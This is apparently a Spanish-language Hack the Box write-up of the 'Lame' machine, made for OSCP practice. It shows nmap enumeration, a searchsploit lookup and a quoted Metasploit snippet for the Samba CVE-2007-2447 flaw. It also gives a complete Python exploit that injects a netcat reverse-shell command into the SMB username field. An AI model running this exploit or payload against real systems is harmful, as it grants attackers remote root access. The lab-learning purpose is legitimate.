---
layout: single
title: Lame - Hack the Box (Español)
date: 2021-05-10
classes: wide
header:
  teaser: /assets/images/lame-writeup/lame_logo.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - HTB
  - SMB vulnerability
---

Esta es una de las maquinas mas sencillas de la lista de TJNULL para la preparacion OSCP, en este desafio nos encontramos con uno que otro servicio que parecen vulnerables mas el servicio a explotar es SMB debido a una vulnerabilidad que permite ejecutar codigo de manera remota con privilegios de usuario root. 



## Solucion de la maquina Lame de Hack the Box

Identificamos todos los puertos que tiene abierto el sistema :

```
> nmap -p- 10.10.10.3

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

Obtenemos las versiones y contenido extra gracias a los scripts de nmap :

```
> nmap -sC -sV -p21,22,139,445,3632 10.10.10.3

21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

Al tener ftp abierto intentamos conectarmos para inspeccionar los archivos dentro de este servidor :

```
> ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:x0pr4nt3s): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

No hay contenido dentro.

Investigamos la version del servicio Samba -> 3.0.20-Debian :

```
> searchsploit samba 3.0.20

---------------------------------------------------------------- ----------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ----------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass          | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execu | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                           | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                           | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                   | linux_x86/dos/36741.py
---------------------------------------------------------------- ----------------------------
```

La unica posible vulnerabilidad que nos podria servir seria : unix/remote/16320.rb , una vez revisamos el contenido de esta vemos el PoC de la vulnerabilidad y en caso esta no se entienda tambien tenemos el CVE :

```ruby
#  ['CVE', '2007-2447' ]

def exploit
	connect
	# lol?
	username = "/=`nohup " + payload.encoded + "`"
	begin
		simple.client.negotiate(false)
		simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
	rescue ::Timeout::Error, XCEPT::LoginError
	# nothing, it either worked or it didn't ;)
	end
```

Lo que podemos entender de esta vulnerabilidad es que una vez nos conectemos al servicio samba, al tratar de loggearnos podemos hacer uso de los metacaracteres para poder ejecutar comandos en el sistema. Ahora para entablarnos una shell podriamos usar el comando "nohup " antes de este ya que permite mantener nuestro proceso(comando) en ejecucion. Por lo que usariamos un payload como este :

``` 
"/=`nohup nc -e /bin/bash <host> <port>`"
```

para entablarnos una reverse shell.

Dicho esto creamos un exploit para conectarnos y entablarnos la reverse shell :

```python
# Author: Cristhoper Heredia aka ( x0pr4nt3s )
# CVE-2007-2447
# +-------------------------------------------+
# |Requerimientos :                           |
# |  - pysmb : pip install pysmb              |
# +-------------------------------------------+


from smb.SMBConnection import SMBConnection
import sys

target="" 
target_port=""
lhost=""
lport=""

def help_panel():
    print("Usage :")
    print("python3 cve-2007-2447.py <rhost> <rport> <lhost> <lport>")

try:
    if(len(sys.argv)==5):
        target=sys.argv[1]
        target_port=sys.argv[2]
        lhost=sys.argv[3]
        lport=sys.argv[4]
    else:
        help_panel()
        sys.exit()
except:
    sys.exit()

payload="/=`nohup nc -e /bin/bash "+lhost+" "+lport+ "`"
try:
    conexion=SMBConnection(payload,"","","")
    print('Conectando...')
    conexion.connect(target,int(target_port))
except:
    print("Error...")

```

Probamos el exploit :

``` 
python3 cve-2007-2447.py 10.10.10.3 445 10.10.14.9 443
```

![root](/assets/images/lame-writeup/root_lame.png)

y listo rooteamos la maquina!!!











